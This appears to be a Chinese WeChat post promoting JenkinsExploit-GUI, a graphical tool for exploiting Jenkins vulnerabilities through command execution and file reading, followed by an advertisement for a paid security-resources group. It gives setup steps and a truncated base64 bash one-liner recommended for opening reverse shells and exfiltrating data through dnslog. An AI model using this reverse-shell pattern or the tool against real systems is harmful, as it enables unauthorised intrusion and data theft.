---
title: 【工具】一款图形化Jenkins综合漏洞利用工具
url: https://mp.weixin.qq.com/s/BQw7wUrAVuW1Y6P0wVEGYA
source: Doonsec's feed
date: 2026-02-14
fetch_date: 2026-02-15T04:15:27.207678
---

# 【工具】一款图形化Jenkins综合漏洞利用工具

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/vOORdxuIJbwWoLkAHnIUukBLduRd6HYnwhpnsgdRMgxvakPtj8KXdwhJjjxp992uwC1icvu2tO4r2PKygvzibglXBdqrW4ibtsmuam4KHH7XRM/0?wx_fmt=jpeg)

# 【工具】一款图形化Jenkins综合漏洞利用工具

原创

track
track

泷羽Sec-track

![]()

在小说阅读器中沉浸阅读

> 声明！本文章所有的工具分享仅仅只是供大家学习交流为主，切勿用于非法用途，如有任何触犯法律的行为，均与本人及团队无关！！！

**往期推荐：**

**[【工具】自动化提取webpack打包前端接口](https://mp.weixin.qq.com/s?__biz=MzkzNzg4MTI0NQ==&mid=2247489826&idx=1&sn=a080afcae6b04a608e1319ad3a82b3ad&scene=21#wechat_redirect)**

**[【工具】Spring-boot框架扫描工具](https://mp.weixin.qq.com/s?__biz=MzkzNzg4MTI0NQ==&mid=2247489797&idx=1&sn=53b8dce68f1309b5c8edc32f021382f2&scene=21#wechat_redirect)**

**[【工具】Heapdump图形化解密工具](https://mp.weixin.qq.com/s?__biz=MzkzNzg4MTI0NQ==&mid=2247489757&idx=1&sn=c2cf8a9062c6524b6cd83e4ccd3888f5&scene=21#wechat_redirect)**

**[【工具】VueCrack-一键检测Vue站点未授权漏洞](https://mp.weixin.qq.com/s?__biz=MzkzNzg4MTI0NQ==&mid=2247489723&idx=1&sn=a7470a5198e7da10c015f16593969f02&scene=21#wechat_redirect)**

**[【工具】Burp自动化SSRF检测插件](https://mp.weixin.qq.com/s?__biz=MzkzNzg4MTI0NQ==&mid=2247489734&idx=1&sn=74d2794df8fab7fc0cc839c18b00e955&scene=21#wechat_redirect)**

**公众号：**

公众号后台回复**260214**即可获取工具

# JenkinsExploit-GUI

一款Jenkins综合漏洞利用工具，名为 **JenkinsExploit-GUI** 的工具，采用图形化界面设计，将复杂的漏洞利用过程简化为一键式操作，极大降低了安全测试的技术门槛。它不仅支持对Jenkins多个历史版本中存在的高危漏洞进行检测，还提供了便捷的命令执行和文件读取功能，帮助用户快速评估目标系统的安全状况

## 使用配置

环境

```
jdk 8+
```

```
源地址：https://github.com/TheBeastofwar/JenkinsExploit-GUI
```

### 外置payload

从release下载windows\_tools,linux\_tools或macOS\_tools并放在与JenkinsExploit-GUI-\*-SNAPSHOT.jar相同的目录,或者可以自行打包tools\_source中的python源码文件

如果是linux或macOS的话需要对外置payload进行chmod +x 赋予权限

![image-20260214215437406](https://mmbiz.qpic.cn/mmbiz_png/vOORdxuIJbz3woP4uKFliab4UaxANXI0QA7HwNdtz0lqDozicBPm9MgptM75xgguRGiacFVW6OMvbTBY2TCU1DgTHRaCO8RU8FEqGglVN6x1Go/640?wx_fmt=png&from=appmsg)

image-20260214215437406

可用exe

![image-20260214215449398](https://mmbiz.qpic.cn/mmbiz_png/vOORdxuIJbyq7SsNDfK0Yvump33Byxp32SNmgyBbjYuIsPib6m6evc6HtdLQdkcTvIvRBYyB4Gegzzkg8tlOGshdMKlCwCCp38G4az2v81dc/640?wx_fmt=png&from=appmsg)

image-20260214215449398

### dnslog配置

进行dnslog设置,目前仅支持dnslog.pw和ceye.io

![image-20260214215509445](https://mmbiz.qpic.cn/mmbiz_png/vOORdxuIJbxDzmRiaBymkvm7PV9aV4cTlJ4Q3PcAHsOydopmSCYlwicFRiare1Vr83GZ0iagXp92u3ZpOxmVduElk1w6eQJTwM49VoBU98cAlT0/640?wx_fmt=png&from=appmsg)

image-20260214215509445

配置

![image-20260214215521341](https://mmbiz.qpic.cn/sz_mmbiz_png/vOORdxuIJbxkybV5z6Ow1YnHpu9WM5BkiarLhsZmibW1sOoic2JGbZGNEXGY9GDmGVuI174c1Tqbya6o1WIVOPIWHVdYoBDwSjjcgKqLcHRtzE/640?wx_fmt=png&from=appmsg)

image-20260214215521341

### 漏洞检测

![image-20260214215536356](https://mmbiz.qpic.cn/mmbiz_png/vOORdxuIJbzYw6ibxOicujjRuwX4sQVqribG2kvhE845A6SFrNlTyZVrNOAxMBNic419YcEK2MVibveEKr5syr0Cb996x5P61wH4kEAicaOWfRFUU/640?wx_fmt=png&from=appmsg)

image-20260214215536356

* 在验证无回显命令执行的时候为了避免转义问题,推荐用如下方式进行反弹shell和dnslog外带信息

```
bash -c {echo,Y....}|{base64,-d}|{bash,-i}
```

## 支持检测

目前支持以下

![image-20260214215201549](https://mmbiz.qpic.cn/mmbiz_png/vOORdxuIJby5fYGyL7HeQod0wwujN7Vbe3xztR1noZ9QSVCbmtGl9dOHTEmcqMSKoBkqPFPdvf3sbUoZNicy1dy445l66AGdeM8cHia5K0VFY/640?wx_fmt=png&from=appmsg)

image-20260214215201549

## 测试案例

命令执行

![image-20260214215708499](https://mmbiz.qpic.cn/mmbiz_png/vOORdxuIJbx5spxZSxYJyOICa4qicBmyDxPmHhI4yWRlaWZZUbUC4ibE2uKTqEwX4P5JIJbgXT2h3lWOQVgF0EUEzk0DJQKdvOvWQJmQw7bZ8/640?wx_fmt=png&from=appmsg)

image-20260214215708499

文件读取

![image-20260214215723937](https://mmbiz.qpic.cn/sz_mmbiz_png/vOORdxuIJbxVpbtO9UfbnWjrdzyCLhyXDdcHQMhw4a2EunmYRTBWA237yua0nJmKaVjSOe4qR0QbksN215ODFRwrI8SIdchCwZYHdypyibNU/640?wx_fmt=png&from=appmsg)

image-20260214215723937

## 源码打包

使用如下命令

```
mvn clean package -DskipTests
cd target
zip -d  JenkinsExploit-GUI-*-SNAPSHOT.jar 'META-INF/*.SF' 'META-INF/*.RSA' 'META-INF/*DSA'
```

# 广告时间

**感兴趣的师傅可以看看我们的内部知识星球，包含各种福利**

* 1000+份SRC报告（覆盖各主流SRC平台、通用格式、复现技巧）
* 常用漏洞脚本 / 渗透工具合集
* 网络安全电子书资料包
* SRC报告 / 测试报告模板
* 常见渗透面试题+思路答法
* 若干方向的学习资料合集（CTF、免杀、AI安全、应急响应、渗透、内网、安卓逆向、开发语言、面试题等）
* 社群问答 / 项目机会 / 职业建议

部分资源展示![资源预览](https://mmbiz.qpic.cn/mmbiz_png/vOORdxuIJbx3etTMJvs7fBE42Lmn9cX14NUqAicC7v4tZ7v189o775QWKVRwXnvth6kfEGN5B4hgoWk4HeOskkHicHGajciaNND5kXAmRXh7ia4/640?wx_fmt=png&from=appmsg)

![9084ce2aaa2473e734e083b054dd91c9](https://mmbiz.qpic.cn/sz_mmbiz_png/vOORdxuIJbwNbfwUia25BsVSYgAfH9RdCJHupnJaHwNdyuGGZuoUhP8cibkqa37JaS57ebGdPdcl5DiaJ9JSvGVqsa4CL8COIG2DOtysNHTqf0/640?wx_fmt=png&from=appmsg)

9084ce2aaa2473e734e083b054dd91c9

![e8a94d452242c4bb72618077b320bb60](https://mmbiz.qpic.cn/mmbiz_png/vOORdxuIJbx3V5ZRAAaqaKOibKiaVGowrfwb6LWNOe0nibwcmnIt3HofSGmiabAUiaNYxju5Dibra6d1VLWsBtJVbbvg1IBQRsOBhlgy30Y41lMFA/640?wx_fmt=png&from=appmsg)

e8a94d452242c4bb72618077b320bb60

![84f58b438ec04c44da38901f08c96ab0](https://mmbiz.qpic.cn/mmbiz_png/vOORdxuIJbxdk0Q5VqJJ4oULskWePfgzfrib8j35JzQVzjY97kJLBPaib3a8HicBTcSC392RQMydiadH6fjZbAXibsKPicwXbSWOF2uDiaZUL8ajmA/640?wx_fmt=png&from=appmsg)

84f58b438ec04c44da38901f08c96ab0

![25b07856ed6e77f7e9f314542a8cb22f](https://mmbiz.qpic.cn/sz_mmbiz_png/vOORdxuIJbwdmf9HmCqib4ZPBFnavbcibMKnYnHbIvMxxcHyT7u1POMDnI3EHP8G7ycYjdsEcwL9610qjbVGP5hwXWrKAib1jhFiaibYaGpyzuvM/640?wx_fmt=png&from=appmsg)

25b07856ed6e77f7e9f314542a8cb22f

帮会专注于分享网络安全领域的资料收集分享，**包括且不限于**：渗透测试报告、渗透工具、学习资料、漏洞挖掘、各种源码系统、破解工具、安全运维、代码审计、安卓逆向、CTF比赛技巧、红队攻防等等。

目前帮会已有**1400+资源**，已有**680+会员**，期待你加入我们~

![6a3307cf0e4af074dd3374fb50b86a78](https://mmbiz.qpic.cn/mmbiz_jpg/vOORdxuIJbw6Kpfbicc11icoOIHibuCib0bc9l87NenKMiawWkhh3ywCMicSsFdtz4xbcCSkd9MCx7MrCzWz2aff2JSzE1YxSlcLD3ibfb85c1Hvsw/640?wx_fmt=jpeg&from=appmsg)

6a3307cf0e4af074dd3374fb50b86a78

知识大陆扫描二维码即可

![微信图片_20260214084541_41_38](https://mmbiz.qpic.cn/sz_mmbiz_jpg/vOORdxuIJbx3FF8ITBjs0Npkc8vuJnoJYyWkgtzBhXPRsKzk3AqlEaB622jhApua9oiabRCcGp8SFkPcZRGcpvHb8PPSa2XQxtxqeCAFmsV4/640?wx_fmt=jpeg&from=appmsg)

微信图片\_20260214084541\_41\_38

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2ob06EicM7DDKBlMjOVw0mmNOVKLafx8sRvQbcCQ91ACGG0DWnFb85TOIUSQBgWWmibMSa9KiaEfQXA/0?wx_fmt=png)

泷羽Sec-track

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2ob06EicM7DDKBlMjOVw0mmNOVKLafx8sRvQbcCQ91ACGG0DWnFb85TOIUSQBgWWmibMSa9KiaEfQXA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过